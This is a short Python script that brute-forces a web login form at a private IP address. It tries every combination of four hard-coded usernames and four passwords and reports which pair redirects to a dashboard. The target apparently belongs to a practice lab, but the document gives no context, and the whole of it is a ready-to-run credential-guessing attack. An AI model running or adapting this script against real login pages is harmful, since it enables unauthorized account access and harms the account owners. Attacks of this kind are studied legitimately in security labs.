import itertools
import requests

url = "http://10.129.1.15/login.php"

usernames = ["aron", "pwnmeow", "egotisticalsw", "admin"]

passwords = [
    "root",
    "Supersecretpassword1",
    "@BaASD&9032123sADS",
    "rKXM59ESxesUFHAd"
]

for username, password in itertools.product(usernames, passwords):
    session = requests.Session()

    data = {
        "Username": username,
        "Password": password,
        "Submit": "Login"
    }

    r = session.post(url, data=data, allow_redirects=False)

    print(f"Trying {username}:{password} -> {r.status_code}")

    if r.status_code in [301, 302]:
        location = r.headers.get("Location", "")
        print(f"Redirect: {location}")

        if "dashboard" in location.lower():
            print("\n[+] Valid credentials found!")
            print(f"Username: {username}")
            print(f"Password: {password}")
            break
